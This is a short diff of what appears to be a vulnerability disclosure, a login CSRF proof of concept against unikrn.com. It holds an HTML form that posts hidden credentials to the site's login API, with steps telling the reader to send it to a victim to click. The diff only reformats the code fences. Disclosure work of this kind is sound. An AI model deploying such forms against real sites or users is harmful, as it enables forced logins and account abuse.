@@ -26,7 +26,7 @@ if (isAwesome){
 }
 ```
 
-```<html>
+``` <html>
 <body>
 <form action="https://unikrn.com/apiv1/login" method="POST">
 <input type="hidden" name="usr" value="[email]">
@@ -34,8 +34,9 @@ if (isAwesome){
 <input type="submit" value="Submit request" />
 </form>
 </body>
-</html>
-```
+</html>```
+
+
 2. Replace the email and password with the valid credentials.
 3. Send the script to the victim to make them click.
 
